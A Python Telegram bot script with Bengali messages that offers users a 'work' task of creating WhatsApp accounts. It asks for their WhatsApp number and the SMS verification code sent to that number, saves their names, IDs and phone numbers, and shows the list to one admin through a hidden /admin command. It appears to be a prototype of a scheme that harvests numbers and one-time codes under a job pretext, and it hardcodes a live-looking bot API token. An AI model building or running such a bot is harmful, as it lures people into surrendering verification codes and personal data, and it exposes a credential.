import telebot
from telebot import types

# আপনার দেওয়া বটের টোকেন এবং অ্যাডমিন আইডি সরাসরি বসিয়ে দেওয়া হলো
API_TOKEN = '8923322759:AAEeHZqzCdx-cqW38eZZ4Ry59n4G-0qxV60'
ADMIN_ID = 8406901797

bot = telebot.TeleBot(API_TOKEN)

# ডেটা সাময়িকভাবে জমা রাখার জন্য ডিকশনারি
user_data = {}
# সফলভাবে সম্পন্ন হওয়া কাজের ডাটা জমা রাখার লিস্ট
completed_jobs = []

# ১. শুরু করার কমান্ড (/start বা হোম পেজ)
@bot.message_handler(commands=['start'])
def main_menu(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(types.KeyboardButton('📝 Work-(কাজ) 📝'))
    bot.send_message(
        message.chat.id, 
        "👋 স্বাগতম! কাজ শুরু করতে নিচের বাটনে চাপুন:", 
        reply_markup=markup
    )

# ২. মূল কিবোর্ড বাটন হ্যান্ডলার
@bot.message_handler(func=lambda message: message.text in ['📝 Work-(কাজ) 📝', '✅ কাজ শেষ'])
def handle_main_buttons(message):
    chat_id = message.chat.id
    
    if message.text == '📝 Work-(কাজ) 📝':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.row(types.KeyboardButton('🟢 WhatsApp'))
        markup.row(types.KeyboardButton('⬅️ Keluar (Back)'), types.KeyboardButton('🔝 Menu Utama'))
        
        bot.send_message(
            chat_id, 
            "👨‍💻 অ্যাকাউন্ট ক্রিয়েট 👨‍💻", 
            reply_markup=markup
        )
        
    elif message.text == '✅ কাজ শেষ':
        if chat_id in user_data and "phone" in user_data[chat_id]:
            job_info = {
                "name": message.from_user.first_name,
                "username": f"@{message.from_user.username}" if message.from_user.username else "নাই",
                "user_id": chat_id,
                "phone": user_data[chat_id]["phone"]
            }
            completed_jobs.append(job_info)
            del user_data[chat_id]

        bot.send_message(
            chat_id, 
            "👨‍💻 আপনার কাজটি রিভিউতে আছে এক থেকে ৪৮ ঘণ্টার ভিতরে চেক করা হবে ধন্যবাদ 👨‍💻"
        )
        main_menu(message)

# ৩. হোয়াটসঅ্যাপ বাটন এবং ব্যাক মেনু হ্যান্ডলার
@bot.message_handler(func=lambda message: message.text in ['🟢 WhatsApp', '⬅️ Keluar (Back)', '🔝 Menu Utama'])
def handle_sub_buttons(message):
    chat_id = message.chat.id
    
    if message.text == '🟢 WhatsApp':
        msg = bot.send_message(chat_id, "📞 আপনার হোয়াটসঅ্যাপ নাম্বারটি দিন (যেমন: 017XXXXXXXX):")
        bot.register_next_step_handler(msg, process_phone)
        
    elif message.text in ['⬅️ Keluar (Back)', '🔝 Menu Utama']:
        main_menu(message)

# ৪. নাম্বার রিসিভ এবং কোড চাওয়ার ধাপ
def process_phone(message):
    chat_id = message.chat.id
    phone_number = message.text
    
    user_data[chat_id] = {"phone": phone_number, "correct_code": "7788"}
    
    bot.send_message(chat_id, f"📥 নাম্বার {phone_number} রিসিভ হয়েছে এবং অ্যাকাউন্ট খোলার প্রসেস শুরু হয়েছে।")
    msg = bot.send_message(chat_id, "🔐 আপনার ফোন নাম্বারে এসএমএসে পাওয়া ৬ ডিজিটের কোডটি দিন (টেস্ট কোড: 7788):")
    bot.register_next_step_handler(msg, verify_code)

# ۵. কোড ভেরিফিকেশন এবং 'কাজ শেষ' বাটন প্রদর্শন
def verify_code(message):
    chat_id = message.chat.id
    user_input_code = message.text
    
    if chat_id in user_data:
        correct_code = user_data[chat_id]["correct_code"]
        
        if user_input_code == correct_code:
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            markup.row(types.KeyboardButton('✅ কাজ শেষ'))
            bot.send_message(
                chat_id, 
                "🎉 কোড সঠিক হয়েছে! অ্যাকাউন্ট সফলভাবে তৈরি করা হয়েছে। কাজ জমা দিতে নিচের বাটনে চাপুন।", 
                reply_markup=markup
            )
        else:
            msg = bot.send_message(chat_id, "❌ ভুল কোড! দয়া করে আপনার এসএমএসে আসা সঠিক কোডটি আবার দিন:")
            bot.register_next_step_handler(msg, verify_code)

# 🔐 ৬. গোপন অ্যাডমিন কমান্ড (শুধুমাত্র আপনার আইডির জন্য)
@bot.message_handler(commands=['admin'])
def show_admin_panel(message):
    if message.chat.id == ADMIN_ID:
        if not completed_jobs:
            bot.send_message(message.chat.id, "📭 এখন পর্যন্ত কেউ কোনো কাজ জমা দেয়নি।")
            return
        
        report = "📋 **জমা হওয়া কাজের তালিকা:**\n\n"
        for index, job in enumerate(completed_jobs, 1):
            report += f"{index}. 👤 নাম: {job['name']}\n"
            report += f"🆔 আইডি: {job['user_id']}\n"
            report += f"🔗 ইউজারনেম: {job['username']}\n"
            report += f"📞 হোয়াটসঅ্যাপ নাম্বার: `{job['phone']}`\n"
            report += "-------------------------\n"
            
        markup = types.InlineKeyboardMarkup()
        clear_btn = types.InlineKeyboardButton("🗑️ সব ডাটা মুছে ফেলুন", callback_data="clear_all_data")
        markup.add(clear_btn)
        
        bot.send_message(message.chat.id, report, parse_mode="Markdown", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "❌ দুঃখিত, এই কমান্ডটি ব্যবহারের অনুমতি আপনার নেই।")

# ৭. ডাটা মুছে ফেলার ইনলাইন বাটন অ্যাকশন
@bot.callback_query_handler(func=lambda call: call.data == "clear_all_data")
def clear_data_callback(call):
    if call.message.chat.id == ADMIN_ID:
        global completed_jobs
        completed_jobs = []
        bot.answer_callback_query(call.id, "✅ সব ডাটা সফলভাবে মুছে ফেলা হয়েছে!")
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="🗑️ ডাটাবেজের সব তথ্য মুছে ফেলা হয়েছে।")
    else:
        bot.answer_callback_query(call.id, "❌ এই অ্যাকশনটি নেওয়ার অনুমতি আপনার নেই।", show_alert=True)

# বট চালু রাখার কমান্ড
bot.infinity_polling()
